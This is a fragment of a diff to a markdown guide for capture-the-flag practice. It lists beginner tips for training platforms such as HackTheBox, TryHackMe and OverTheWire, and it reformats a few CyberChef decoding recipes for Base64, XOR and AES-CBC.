-- **CryptoHack**: Complete the "Introduction" and "General" sections first; JSON API-based challenges
+Tips for each:
+- HackTheBox: Use the "Starting Point" machines for guided intro; look at retired machines for writeups
+- TryHackMe: Complete the "Pre-Security" and "Jr Penetration Tester" paths before CTFs
+- PicoCTF: Great for building fundamentals; picoCTF gym has all past challenges available year-round
+- CTFtime: Check upcoming CTF events, filter by weight and type; team registration happens here
+- pwn.college: Work through modules sequentially; the dojos are self-contained and auto-graded
+- OverTheWire: Start with Bandit (Linux basics) -> Leviathan -> Natas (web) -> Narnia (binary)
+- CryptoHack: Complete the "Introduction" and "General" sections first; JSON API-based challenges
 
 ---
 
@@ -999,8 +999,8 @@ from Crypto.Util.number import long_to_bytes, bytes_to_long
 
 CyberChef operations can be chained in the browser at https://gchq.github.io/CyberChef
 
-**Common recipes (paste into "Recipe" or use as URL):**
-- From Base64 → To Hex: `[{"op":"From Base64"},{"op":"To Hex"}]`
+Common recipes (paste into "Recipe" or use as URL):
+- From Base64 -> To Hex: `[{"op":"From Base64"},{"op":"To Hex"}]`
 - Detect and strip encodings: Use the "Magic" operation with depth 3+
 - XOR with known key: `[{"op":"XOR","args":[{"option":"Hex","string":"deadbeef"},"Standard",false]}]`
 - Decrypt AES-CBC: `[{"op":"AES Decrypt","args":[{"option":"Hex","string":"key"},{"option":"Hex","string":"iv"},"CBC","Raw","Raw"]}]`
